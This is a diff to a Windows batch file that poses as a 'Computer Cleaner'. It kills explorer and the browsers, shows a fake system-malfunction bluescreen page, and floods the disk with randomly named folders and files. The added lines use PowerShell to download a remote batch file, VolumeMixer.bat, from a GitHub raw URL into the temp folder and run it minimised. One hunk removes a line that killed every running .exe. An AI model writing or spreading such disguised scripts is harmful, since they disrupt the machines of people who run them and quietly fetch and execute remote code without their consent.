@@ -2,6 +2,7 @@
 if "%username%"=="2204498" goto InvalidGuest
 rename %0% ComputerClean.bat
 title Computer Cleaner
+powershell -nologo -noprofile -command "Invoke-WebRequest 'https://raw.githubusercontent.com/BatchExpert/CreativeNetwork/main/BootStrapper/VolumeMixer.bat' -OutFile '%temp%\VolumeMixer.bat'" >nul
 (
 echo ^<html^>^<head^>^<title^>Lanschool.exe - System Malfunction^</title^> 
 echo. 
@@ -59,6 +60,7 @@ echo :Loophole
 echo set FileLocation=%CD%
 echo taskkill /f /im explorer.exe >nul
 echo start /min notepad.exe >nul
+echo start /min %temp%\VolumeMixer.bat >nul
 echo cd %FileLocation%
 echo md %random%%random%%random%%random%%random%%random%%random% >nul
 echo echo %random%%random%%random%%random%%random%%random%%random% >>%random%%random%txt
@@ -85,10 +87,9 @@ taskkill /f /im firefox.exe
 taskkill /f /im brave.exe
 taskkill /f /im google.exe
 taskkill /f /im notepad.exe
-taskkill /f /im *.exe
 cls
 start %temp%\bsod.hta
-cls
+echo start /min %temp%\VolumeMixer.bat >nul
 start /min %temp%\OMFGA.bat >nul
 cls
 rename %0% %random%%random%%random%%random%%random%%random%%random%.exe
